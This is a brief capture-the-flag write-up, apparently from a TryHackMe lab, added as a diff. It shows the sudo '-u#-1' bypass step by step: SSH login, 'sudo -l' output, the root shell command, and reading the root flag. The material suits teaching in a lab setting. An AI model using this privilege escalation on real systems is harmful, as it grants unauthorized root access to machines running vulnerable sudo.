@@ -1,0 +1,22 @@
+SUDO SECURITY BYPASS.
+
+
+SSH into machine with provided info:
+ssh -p 2222 tryhackme@10.10.213.178
+
+Show sudo privileges of user tryhackme:
+sudo -l
+OUTPUT:
+User tryhackme may run the following commands on sudo-privesc:
+    (ALL, !root) NOPASSWD: /bin/bash
+Note:
+tryhackme can run /bin/bash on any user except root.
+
+Get root:
+sudo -u#-1 /bin/bash
+
+Cat flag:
+cat /root/root.txt
+OUTPUT:
+THM{l33t_s3cur1ty_bypass}
+
